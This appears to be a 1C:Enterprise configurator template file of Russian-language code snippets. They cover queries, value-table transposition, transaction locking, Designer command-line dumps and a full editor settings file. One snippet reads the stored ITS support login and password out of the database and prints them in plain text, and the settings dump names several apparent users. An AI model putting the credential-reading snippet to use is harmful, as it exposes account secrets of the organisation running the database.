				// Не удалось распознать ошибку, проброс первичной ошибки.
				ВызватьИсключение;
			
			КонецПопытки;
		КонецЦикла;
	Иначе
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Неверный тип второго параметра Реквизиты: %1'""), Строка(ТипЗнч(Реквизиты)));
	КонецЕсли;
	
	// Подготовка результата (после выполнения запроса переопределится).
	Результат = Новый Структура;
	
	// Формирование текста запроса к выбираемым полям.
	ТекстЗапросаПолей = """";
	Для каждого КлючИЗначение Из СтруктураПолей Цикл
		
		ИмяПоля = ?(ЗначениеЗаполнено(КлючИЗначение.Значение),
						КлючИЗначение.Значение,
						КлючИЗначение.Ключ);
		ПсевдонимПоля = КлючИЗначение.Ключ;
		
		ТекстЗапросаПолей = 
			ТекстЗапросаПолей + ?(ПустаяСтрока(ТекстЗапросаПолей), """", "","") + ""
			|	"" + ИмяПоля + "" КАК "" + ПсевдонимПоля;
		
		
		// Предварительное добавление поля по псевдониму в возвращаемый результат.
		Результат.Вставить(ПсевдонимПоля);
		
	КонецЦикла;
	
	// Если предопределенного нет в ИБ.
	// - приведение результата к отсутствию объекта в ИБ или передаче пустой ссылки.
	Если Ссылка = Неопределено Тогда 
		Возврат Результат;
	КонецЕсли;
	
	ТекстЗапроса = 
		""ВЫБРАТЬ "" + ?(ВыбратьРазрешенные, ""РАЗРЕШЕННЫЕ"", """") + ""
		|"" + ТекстЗапросаПолей + ""
		|ИЗ
		|	"" + ПолноеИмяОбъектаМетаданных + "" КАК Таблица
		|ГДЕ
		|	Таблица.Ссылка = &Ссылка
		|"";
	
	// Выполнение запроса.
	Запрос = Новый Запрос;
	Запрос.УстановитьПараметр(""Ссылка"", Ссылка);
	Запрос.Текст = ТекстЗапроса;
	
	Попытка
		Выборка = Запрос.Выполнить().Выбрать();
	Исключение
		
		// Если реквизиты были переданы строкой, то они уже конвертированы в массив.
		// Если реквизиты - массив, оставляем без изменений.
		// Если реквизиты - структура - конвертируем в массив.
		// В остальных случаях уже было бы выброшено исключение.
		Если Тип(""Структура"") = ТипЗнч(Реквизиты) Тогда
			Реквизиты = Новый Массив;
			Для каждого КлючИЗначение Из СтруктураПолей Цикл
				ИмяПоля = ?(ЗначениеЗаполнено(КлючИЗначение.Значение),
							КлючИЗначение.Значение,
							КлючИЗначение.Ключ);
				Реквизиты.Добавить(ИмяПоля);
			КонецЦикла;
		КонецЕсли;
		
		// Поиск ошибки доступности полей.
		Результат = НайтиОшибкуДоступностиРеквизитовОбъекта(ПолноеИмяОбъектаМетаданных, Реквизиты);
		Если Результат.Ошибка Тогда 
			ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Неверный второй параметр Реквизиты: %1'""), Результат.ОписаниеОшибки);
		КонецЕсли;
		
		// Не удалось распознать ошибку, проброс первичной ошибки.
		ВызватьИсключение;
		
	КонецПопытки;
	
	// Заполнение реквизитов.
	Если Выборка.Следующий() Тогда
		ЗаполнитьЗначенияСвойств(Результат, Выборка);
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции"}
},
{0,
{"Переворот или ТРАНСПОНИРОВАНИЕ Таблицы Значений",0,0,"","Переворот или ТРАНСПОНИРОВАНИЕ Таблицы Значений
Задача такова что необходимо поменять местами Колонки со Строками. Условие Первая колонка значений это название колонок будущей таблицы значений.

Исходная таблица:
Индекс    Колонка1    Колонка2    Колонка3    Колонка4
0    ""Тип11""    ""Тип21""    ""Тип31""    ""Тип41""
1    ""Тип12""    ""Тип22""    ""Тип32""    ""Тип42""
2    ""Тип13""    ""Тип23""    ""Тип33""    ""Тип43""
3    ""Тип14""    ""Тип24""    ""Тип34""    ""Тип44""
4    ""Тип15""    ""Тип25""    ""Тип35""    ""Тип45""

Полученная таблица:
Индекс    Тип11    Тип12    Тип13    Тип14    Тип15
0    ""Тип11""    ""Тип12""    ""Тип13""    ""Тип14""    ""Тип15""
1    ""Тип21""    ""Тип22""    ""Тип23""    ""Тип24""    ""Тип25""
2    ""Тип31""    ""Тип32""    ""Тип33""    ""Тип34""    ""Тип35""
3    ""Тип41""    ""Тип42""    ""Тип43""    ""Тип44""    ""Тип45""

Минус ы : 
1.того что имя колонок первоначальных не видно.
2. Значение исходной таблицы первой колонки должны быть типизированны для название колонок.

P.S. Может поможет кому ;-)
// Функция возвращает перевернутую ТЗ
// Кидаем ТЗ
Функция ПеревернутьТЗ(ТЗ)
	
	ТЗ2 = Новый ТаблицаЗначений;
	Массив=Тз.ВыгрузитьКолонку(Тз.Колонки[0]);
	Для Каждого Значения  ИЗ  Массив ЦИКЛ 		
		ЗН=ВРег(СокрЛП(Значения));
		ТЗ2.Колонки.Добавить(Значения);
	КонецЦикла;
	Для каждого стр из Тз.Колонки Цикл 		
		ТЗ2.Добавить();
	КонецЦикла;
	СчетчикСтрок=-1;
	Для каждого стр из Тз Цикл 		
		СчетчикСтрок=СчетчикСтрок+1;
		Мас= Новый Массив;
		счетчик=-1;
		Для каждого КН из Тз.Колонки Цикл 			счетчик=счетчик+1;
			ЗначениеИндекса=стр[КН.Имя];
			Мас.Вставить(счетчик,ЗначениеИндекса);
		КонецЦикла;
		ТЗ2.ЗагрузитьКолонку(Мас,ТЗ2.колонки[СчетчикСтрок]);
	КонецЦикла;
	Возврат ТЗ2;
	
КонецФункции "}
},
{0,
{"Обход массива если его ТипЗнч",0,0,"","Если ТипЗнч(<?""Название массива (слитно)"">) = Тип(""Массив"") Тогда
	л<?""Название массива (слитно)"">Массив 	= Новый Массив;
	
	Для каждого <?""Название массива (слитно)"">Строка Из л<?""Название массива (слитно)"">Массив Цикл
		
		л<?""Название массива (слитно)"">Массив.Добавить(<?""Название массива (слитно)"">Строка.Наименование);
		
	КонецЦикла;
Иначе
	л<?""Название массива (слитно)"">Наименование 	= <?""Название массива (слитно)"">.Наименование;
КонецЕсли;"}
},
{0,
{"Вопрос с ОписаниеОповещения",0,0,"Вопрос","лОповещение 	= Новый ОписаниеОповещения(""<?""Имя метода после закрытия диалога (слитно)"">"", ЭтаФорма, Параметры);
ПоказатьВопрос(лОповещение, ""Есть вопросы?"", РежимДиалогаВопрос.ДаНет, 0);

&НаКлиенте
Процедура <?""Имя метода после закрытия диалога (слитно)"">(пРезультат, пПараметры) Экспорт
	
	Если пРезультат = КодВозвратаДиалога.Нет Тогда
		Возврат;
	КонецЕсли;
	
КонецПроцедуры"}
},
{0,
{"Цветовая схема кода конфигуратора (ethanschoonover.com/solarized)",0,0,"","https://infostart.ru/public/122391/
ethanschoonover.com/solarized

Несколько цветовых схем для встроенного языка 1С, которые минимизирует нагрузку на глаза, за счет чего повышается производительность!
 

Несколько цветовых схем для встроенного языка 1С, которые минимизирует нагрузку на глаза, за счет чего повышается производительность, а  так же Вы в конце рабочего дня не похожи на быка с налитыми кровью глазами! Цветовое оформление подобрано профессиональной группой, которая специализируется в этой области ethanschoonover.com/solarized.

Для повсеместного использования рекомендую светлую схему. Лично я, использую ее преимущественно в Ubuntu, а так же, по долгу службы в 1С:Предприятие 8.х в Windows - впечатления крайне положительные, предлагаю и Вам попробовать!

Для того что бы установить эту схему, зайдите в конфигуратор 1С 8.х, в меню «Сервис» -> «Параметры», перейдите на закладку «Модули»,  «Редактирование». В этом окне в группу «Выделение цветом синтаксических конструкций» внести следующие изменения:

 

// Светлая цветовая схема

Brightness contrast colorschemes:
Ключевые слова: D24C15
Константы типа ""Число"": B68900
Константы типа ""Строка"": 4CA49C
Константы типа ""Дата"": 859900
Идентификаторы: 258BD3
Операторы: D42F33
Комментарии: 93A1A1
Препроцессор: D53584
Прочее: 899A33  
Фон: FFFBF0
 

// Темная цветовая схема

Low contrast colorschemes:
Ключевые слова: D24C15
Константы типа ""Число"": B68900
Константы типа ""Строка"": 4CA49C
Константы типа ""Дата"": 859900
Идентификаторы: 258BD3
Операторы: D42F33
Комментарии: 93A1A1
Препроцессор: D53584
Прочее: 899A33  
Фон: 002B36
 

// Так же привожу цветовую схему для возвращения к настройкам по умолчанию

Default colorschemes:
Ключевые слова: FF0000
Константы типа ""Число"": 000000
Константы типа ""Строка"": 000000
Константы типа ""Дата"": 000000
Идентификаторы: 0000FF
Операторы: FF0000
Комментарии: 008000
Препроцессор: 963200
Прочее: 000000
Фон: FFFFFF


В окне «Выбора цвета» приведенные цвета вводить в поле «#» ( отмечено на скрине ), если возникли трудности с набором, то переносите настройки копированием ctrl+c / ctrl+v.

Так же рекомендую включить признак Жирный в шрифте, но это зависит от конкретного монитора, смотрите сами как Вам удобнее.

Цветовые схемы, кроме дефолтной, подобраны так, что отличаются только цветом фона, так что любителям работать по ночам, можно легко переключатся.

Доп:
Цветовая схема Visual studio и другие с++ IDE: 
Ключевые слова: 0000E7 
Константы типа ""Число"": 0000FF 
Константы типа ""Строка"": A6692F 
Константы типа ""Дата"": 0000FF 
Идентификаторы: 000000 
Операторы: 000000 
Комментарии: 808080 
Препроцессор: 008000 
Прочее: 000000 
Фон: FFFFFF 

Их еще мона переносить. Нужно скопировать файл 1cv8.pfl расположенный к примеру C:\Documents and Settings\user\Application Data\1C\1Cv81\ и скопировать на другой комп по этому пути и все настройки перенесены. 
Это для 8.1, для 8.2. не проверял
	"}
},
{0,
{"РегистрСведений Удалить 1 запись",0,0,"","лМенеджерЗаписи  		= РегистрыСведений.АйТи_ЗаказыКПодпитке.СоздатьМенеджерЗаписи();
лМенеджерЗаписи.Объект 	= лСсылка;
лМенеджерЗаписи.Прочитать();

Если лМенеджерЗаписи.Выбран() Тогда
	лМенеджерЗаписи.Удалить();
КонецЕсли;"}
},
{0,
{"Присвоить",0,0,"","Функция Присвоить(пЧему, пЧто = Неопределено)
	
	пЧему 	= пЧто;
	Возврат пЧто;
	
КонецФункции // Присвоить()
 "}
},
{0,
{"Из 1с программно прочитать код модулей конфигурации (декомпиляция) (командная строка, ЗапуститьПриложение)",0,0,"","//Из 1с программно прочитать код модулей конфигурации (декомпиляция).
//Требует закрытый конфигуратор, так как будет запускаться программно он.
Кавычка = """""""";
ПутьКБазе = СтрЗаменить(СтрокаСоединения, Кавычка, Кавычка + Кавычка);

КодВозврата = Неопределено;
Кавычка = """""""";
Пользователь = ПользователиИнформационнойБазы.ТекущийПользователь().Имя;
Пароль = """";
ИмяФайлаСообщений = КаталогВыгрузки + ""\СообщенияВыгрузкиКонфигурацииВФайлы.txt"";

ЗапуститьПриложение(Кавычка + КаталогПрограммы + ""1cv8.exe"" + Кавычка + "" DESIGNER""
+ "" /IBConnectionString "" + Кавычка + ПутьКБазе + Кавычка
+ "" /N ""                  + Кавычка + Пользователь + Кавычка
+ "" /P ""                  + Кавычка + Пароль + Кавычка
+ "" /DumpConfigToFiles ""  + Кавычка + КаталогВыгрузки + Кавычка
+ "" /Out ""                + Кавычка + ИмяФайлаСообщений + Кавычка
+ "" /DisableStartupMessages /DisableStartupDialogs ""
,
,
Истина,
КодВозврата);"}
},
{0,
{"Из 1с программно прочитать код внешней обработки (декомпиляция) (командная строка, ЗапуститьПриложение) НЕ ДОДЕЛАНО",0,0,"","//Из 1с программно прочитать код модулей конфигурации (декомпиляция).
//Требует закрытый конфигуратор, так как будет запускаться программно он.
Кавычка 		= """""""";
ПутьКОбработке 	= СтрЗаменить(СтрокаСоединения, Кавычка, Кавычка + Кавычка);
ПутьВыводу 		= ПутьКОбработке;

КодВозврата 	= Неопределено;
Кавычка 		= """""""";
Пользователь 	= ПользователиИнформационнойБазы.ТекущийПользователь().Имя;
Пароль 			= """";
ИмяФайлаСообщений = КаталогВыгрузки + ""\СообщенияВыгрузкиКонфигурацииВФайлы.txt"";

SET PATH1C=""C:\Program Files\1cv8\8.3.15.1489\bin\1cv8.exe"" 
SET EXT_FOLDER=""C:\Обработки"" 
SET SRC=%cd%
SET OUT=%cd%\out.txt
del /f /q ""%OUT%""
FOR %%F IN (*.epf *.erf) DO ( %PATH1C% DESIGNER /DumpExternalDataProcessorOrReportToFiles ""%SRC%"" ""%%F"" /OUT ""%OUT%"" -NoTruncate )
	
ЗапуститьПриложение(Кавычка + КаталогПрограммы + ""1cv8.exe"" + Кавычка + "" DESIGNER""
+ "" /DumpExternalDataProcessorOrReportToFiles "" + Кавычка + ПутьКОбработке + Кавычка
+ "" /OUT ""                + Кавычка + ИмяФайлаСообщений + Кавычка
+ "" -NoTruncate"");"}
},
{0,
{"Как правильно записывать данные с учетом блокировки транзакций",0,0,"","// Бензответственное чтение - доверять данным нельзя
Ссылка = Запрос.Выполнить.БлаБла.Ссылка;

НачатьТранзакцию();
Попытка
	
	// Надо ставить исключительную блокировку на изменяемые данные.
	// Чтобы никто их не мог прочитать до конца транзакции.
	Блокировка 	= Новый БлокировкаДанных;
	ЭлементБлокировки 	= Блокировка.Добавить(""Справочник.Изменяемый"");
	ЭлементБлокировки.УстановитьЗначение(""Ссылка"", Ссылка);
	Блокировка.Заблокировать();
	
	// Надо ставить разделяемую блокировку на читаемые данные.
	// Чтобы никто их не мог записать до конца транзакции, но все могли читать.
	Блокировка 	= Новый БлокировкаДанных;
	ЭлементБлокировки 	= Блокировка.Добавить(""РегистрНакопления.Читаемый"");
	ЭлементБлокировки.УстановитьЗначение(""ИзменяемыйВИзмерении"", Ссылка);
	ЭлементБлокировки.Режим 	= РежимБлокировкиДанных.Разделяемый;
	Блокировка.Заблокировать();
	
	// Ответственное чтение - доверять данным можно.
	Объект 		= Ссылка.ПолучитьОбъект();
	Читаемый 	= РегистрНакопления.Читаемый.СуперПуперВыборка();
	
	// Выполнить установку пессимистической блокировки объекта от изменения другими режимами или пользователями.
	Объект.Заблокировать();
	
	// Изменение объекта
	Объект.Реквизит 	= Читаемый;
	
	// Запись измененного объекта и снятие объектной пессимистической блокировки.
	Объект.Записать();
	
	// Фиксация Транзакции и снятие блокировок на изменение и на чтение данных
	ЗафиксироватьТранзакцию();
	
Исключение
	// Отмена транзакции в случае ошибки в блоке транзакции.
	ОтменитьТранзакцию();
	// Проброс исходного исключения выше по стеку.
	ВызватьИсключение;
	
КонецПопытки;"}
},
{0,
{"Получение логина и пароля ИТС из базы 1С",0,0,"","ДанныеАвторизации 	= ИнтернетПоддержкаПользователей.ДанныеАутентификацииПользователяИнтернетПоддержки();

Попытка
	
	Для Каждого Элемент Из ДанныеАвторизации Цикл
		
		//Сообщить(Элемент.Ключ + "":  "" + Элемент.Значение);
		Если Элемент.Ключ = ""Логин"" Тогда
			лЛогин 	= Элемент.Значение;
		ИначеЕсли Элемент.Ключ = ""Пароль"" Тогда
			лПароль = Элемент.Значение;            
		КонецЕсли; 
		
		Сообщить(лЛогин + "" / "" + лПароль);
		
	КонецЦикла;
	
Исключение
	Сообщить(""Нет данных регистрации ИТС."");
	
КонецПопытки"}
},
{0,
{"Параметры через запятую в массив",0,0,"","лПараметрыМассив 	= СтрРазделить(СтрЗаменить(пПараметры, "" "", """"), "",""); //пПараметры - получаемые параметры через запятую

Для каждого лПараметр Из лПараметрыМассив Цикл
	
	лПараметр
	
КонецЦикла;"}
},
{0,
{"Найстройки конфигуратора (1cv8.pfl)",0,0,"","{
{""""},
{
{""CnfPictureChooserDlg"",
{""LastOpenPage"",
{""N"",0},""""},
{
{""""}
}
},
{""ModuleColorCategory"",
{""Keywords"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{1395922}
}
},""Numerics"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{35254}
}
},""Strings"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{10265676}
}
},""Dates"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{39301}
}
},""Identifiers"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{13863717}
}
},""Operators"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{3354580}
}
},""Comments"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{10592659}
}
},""Preprocessor"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{8664533}
}
},""Others"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{3381897}
}
},""Background"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{15793151}
}
},""CurrentToken"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,3,
{-10}
}
},""CurrentSelection"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,3,
{-10}
}
},""PairLexeme"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{15132390}
}
},""SearchResult"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{13496051}
}
},""AutoAssistBackground"",
{""#"",9cd510c7-abfc-11d4-9434-004095e12fc7,2,
{3,0,
{14285567}
}
},""""},
{
{""""}
}
},
{""ModuleTextEditor"",
{""SyntaxHighlighting"",
{""B"",0},""CheckAutomatically"",
{""B"",1},""ExtCheckAutomatically"",
{""B"",0},""CheckSettings"",
{""#"",4772b3b4-f4a3-49c0-a1a5-8cb5961511a3,
{6,1e512aab-1b41-4ef6-9375-f0137be9dd91,0,0,
{27,
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",1},
{4,0,
{0},"""",-1,-1,0,0,""""},0,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",2},
{4,0,
{0},"""",-1,-1,0,0,""""},1,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",5},
{4,0,
{0},"""",-1,-1,0,0,""""},2,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",6},
{4,0,
{0},"""",-1,-1,0,0,""""},3,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",7},
{4,0,
{0},"""",-1,-1,0,0,""""},4,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",10},
{4,0,
{0},"""",-1,-1,0,0,""""},5,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",11},
{4,0,
{0},"""",-1,-1,0,0,""""},6,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",50},
{4,0,
{0},"""",-1,-1,0,0,""""},7,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",12},
{4,0,
{0},"""",-1,-1,0,0,""""},8,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",101},
{4,0,
{0},"""",-1,-1,0,0,""""},9,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",102},
{4,0,
{0},"""",-1,-1,0,0,""""},10,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",105},
{4,0,
{0},"""",-1,-1,0,0,""""},11,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",106},
{4,0,
{0},"""",-1,-1,0,0,""""},12,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",107},
{4,0,
{0},"""",-1,-1,0,0,""""},13,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",110},
{4,0,
{0},"""",-1,-1,0,0,""""},14,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",111},
{4,0,
{0},"""",-1,-1,0,0,""""},15,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",150},
{4,0,
{0},"""",-1,-1,0,0,""""},16,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",112},
{4,0,
{0},"""",-1,-1,0,0,""""},17,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",201},
{4,0,
{0},"""",-1,-1,0,0,""""},18,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",202},
{4,0,
{0},"""",-1,-1,0,0,""""},19,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",205},
{4,0,
{0},"""",-1,-1,0,0,""""},20,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",206},
{4,0,
{0},"""",-1,-1,0,0,""""},21,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",207},
{4,0,
{0},"""",-1,-1,0,0,""""},22,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",210},
{4,0,
{0},"""",-1,-1,0,0,""""},23,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",1,
{""N"",211},
{4,0,
{0},"""",-1,-1,0,0,""""},24,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",250},
{4,0,
{0},"""",-1,-1,0,0,""""},25,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""N"",212},
{4,0,
{0},"""",-1,-1,0,0,""""},26,0,""""}
}
},
{""Pattern""},0,26}
},""AutoPlacement"",
{""N"",2},""ReplaceTabOnInput"",
{""B"",0},""TabSize"",
{""N"",4},""IndentMode"",
{""N"",2},""UseAutoPlacementInComments"",
{""B"",0},""Font"",
{""#"",9cd510c8-abfc-11d4-9434-004095e12fc7,1,
{7,0,0,100,0,0,0,700,0,0,0,1,3,2,1,49,""Courier New"",1,100},0},""ProcCollapse"",
{""N"",2},""ProcCommentCollapse"",
{""N"",2},""LoopCollapse"",
{""N"",0},""ConditionCollapse"",
{""N"",0},""RegionCollapse"",
{""N"",1},""RegionsCommentCollapse"",
{""N"",2},""""},
{
{""""}
}
},
{""Launch"",
{""WebBrowser2"",
{""N"",0},""DisplayAllFunctions"",
{""B"",1},""MRULaunchUserList"",
{""#"",4772b3b4-f4a3-49c0-a1a5-8cb5961511a3,
{6,1e512aab-1b41-4ef6-9375-f0137be9dd91,1,8,
{3,
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""S"",""Иванова (бухгалтер)	""},
{4,0,
{0},"""",-1,-1,0,0,""""},4,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""S"",""ИвановаА""},
{4,0,
{0},"""",-1,-1,0,0,""""},3,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""S"",""КондратовичЯД""},
{4,0,
{0},"""",-1,-1,0,0,""""},1,0,""""}
}
},
{""Pattern""},0,4}
},""""},
{
{""""}
}
},
{""ModuleRefactoring"",
{""Modality"",
{""B"",1},""Synchronous"",
{""B"",1},""""},
{
{""""}
}
},
{""TextAssist"",
{""PointAutoAssist"",
{""B"",1},""AssignAutoAssist"",
{""B"",1},""QuoteAutoAssist"",
{""B"",1},""BracketAutoAssist"",
{""B"",1},""IncludeTemplates"",
{""B"",0},""IncludeKeywords"",
{""B"",1},""""},
{
{""""}
}
},
{""Config"",
{""MAUseADB"",
{""B"",0},""MAAndroidSDKPath"",
{""S"",""""},""MAPlatformPath"",
{""S"",""""},""MADeviceName"",
{""S"",""""},""MALaunchParam"",
{""N"",2},""""},
{
{""""}
}
},
{""ExternalMergeProgs"",
{""List"",
{""#"",4772b3b4-f4a3-49c0-a1a5-8cb5961511a3,
{6,1e512aab-1b41-4ef6-9375-f0137be9dd91,0,0,
{5,
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,2a9c9991-e363-474a-abfb-03f2d22aafd0},
{4,0,
{0},"""",-1,-1,0,0,""""},0,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,134d4db0-dbbf-4234-863e-4c95029d1e9e},
{4,0,
{0},"""",-1,-1,0,0,""""},1,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,e56e8b60-cb68-4355-bb74-500095efb2c6},
{4,0,
{0},"""",-1,-1,0,0,""""},2,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,52fea0af-51af-43d1-88d2-f7d730d463d3},
{4,0,
{0},"""",-1,-1,0,0,""""},3,0,""""}
},
{1e512aab-1b41-4ef6-9375-f0137be9dd91,
{"""",0,
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,5005872a-7e5a-4f82-ac9a-65ff444c103e},
{4,0,
{0},"""",-1,-1,0,0,""""},4,0,""""}
}
},
{""Pattern""},0,4}
},""ShowDiffProg"",
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,00000000-0000-0000-0000-000000000000},""MergeTwoProg"",
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,00000000-0000-0000-0000-000000000000},""MergeThreeWayProgStd"",
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,00000000-0000-0000-0000-000000000000},""MergeThreeWayProgEP"",
{""#"",fc01b5df-97fe-449b-83d4-218a090e681e,00000000-0000-0000-0000-000000000000},""UseModeByDefaultForModule"",
{""B"",0},""""},
{
{""2a9c9991-e363-474a-abfb-03f2d22aafd0"",
{""Name"",
{""S"",""Araxis Merge""},""Path"",
{""S"",""""},""CompareTwoCommand"",
{""S"",""/wait /readonly /2 /title1:%baseCfgTitle /title2:%secondCfgTitle %baseCfg %secondCfg""},""MergeTwoCommand"",
{""S"",""/wait /2 /title1:%baseCfgTitle /title2:%secondCfgTitle %baseCfg %secondCfg %merged""},""MergeThreeCommand"",
{""S"",""/wait /3 /merge /a1 /title1:%oldVendorCfgTitle /title2:%baseCfgTitle /title3:%secondCfgTitle %oldVendorCfg %baseCfg %secondCfg %merged""},""AutoMergeThreeCommand"",
{""S"",""""},""""},
{
{""""}
}
},
{""134d4db0-dbbf-4234-863e-4c95029d1e9e"",
{""Name"",
{""S"",""DiffMerge""},""Path"",
{""S"",""""},""CompareTwoCommand"",
{""S"",""-nosplash -ro2 -t1=%baseCfgTitle -t2=%secondCfgTitle %baseCfg %secondCfg""},""MergeTwoCommand"",
{""S"",""""},""MergeThreeCommand"",
{""S"",""-nosplash -result=%merged -t1=%baseCfgTitle -t2=%oldVendorCfgTitle -t3=%secondCfgTitle %baseCfg %oldVendorCfg %secondCfg""},""AutoMergeThreeCommand"",
{""S"",""""},""""},
{
{""""}
}
},
{""e56e8b60-cb68-4355-bb74-500095efb2c6"",
{""Name"",
{""S"",""KDiff3""},""Path"",
{""S"",""""},""CompareTwoCommand"",
{""S"",""%baseCfg %secondCfg --L1 %baseCfgTitle --L2 %secondCfgTitle""},""MergeTwoCommand"",
{""S"",""%baseCfg %secondCfg --L1 %baseCfgTitle --L2 %secondCfgTitle -o %merged""},""MergeThreeCommand"",
{""S"",""%oldVendorCfg %baseCfg %secondCfg --L1 %oldVendorCfgTitle --L2 %baseCfgTitle --L3 %secondCfgTitle -o %merged""},""AutoMergeThreeCommand"",
{""S"",""%oldVendorCfg %baseCfg %secondCfg --L1 %oldVendorCfgTitle --L2 %baseCfgTitle --L3 %secondCfgTitle -o %merged --auto""},""""},
{
{""""}
}
},
{""52fea0af-51af-43d1-88d2-f7d730d463d3"",
{""Name"",
{""S"",""TortoiseMerge""},""Path"",
{""S"",""""},""CompareTwoCommand"",
{""S"",""/readonly /basename:%baseCfgTitle /minename:%secondCfgTitle /mine:%secondCfg /base:%baseCfg""},""MergeTwoCommand"",
{""S"",""""},""MergeThreeCommand"",
{""S"",""/theirsname:%baseCfgTitle /basename:%oldVendorCfgTitle /minename:%secondCfgTitle /theirs:%baseCfg /base:%oldVendorCfg /mine:%secondCfg /merged:%merged""},""AutoMergeThreeCommand"",
{""S"",""""},""""},
{
{""""}
}
},
{""5005872a-7e5a-4f82-ac9a-65ff444c103e"",
{""Name"",
{""S"",""Perforce P4Merge""},""Path"",
{""S"",""""},""CompareTwoCommand"",
{""S"",""-C utf8-bom -nl %baseCfgTitle -nr %secondCfgTitle %baseCfg %secondCfg""},""MergeTwoCommand"",
{""S"",""""},""MergeThreeCommand"",
{""S"",""-C utf8-bom -nl %baseCfgTitle -nr %secondCfgTitle -nb %oldVendorCfgTitle %oldVendorCfg %baseCfg %secondCfg %merged""},""AutoMergeThreeCommand"",
{""S"",""""},""""},
{
{""""}
}
},
{""""}
}
},
{""debug"",
{""WatchVisible"",
{""B"",0},""CallStackVisible"",
{""B"",0},""""},
{
{""""}
}
},
{""67263150.06"",
{""21BA8BB0-FFFE-4c6c-93E8-38119F0FA7DA"",
{""N"",1.760697647963692469},""""},
{
{""""}
}
},
{""65432355.12"",
{""21BA8BB0-FFFE-4c6c-93E8-38119F0FA7DA"",
{""N"",1.620590805463749509},""""},
{
{""""}
}
},
{""71999336.97"",
{""21BA8BB0-FFFE-4c6c-93E8-38119F0FA7DA"",
{""N"",6.405697631463212341},""""},
{
{""""}
}
},
{""""}
}
}"}
},
{0,
{"Определить версию платформы, версию (редакцию) конфигурации",0,0,"","СистемнаяИнформация = Новый СистемнаяИнформация;
//Определить версию платформы ""1С:Предприятие""
СистемнаяИнформация.ВерсияПриложения
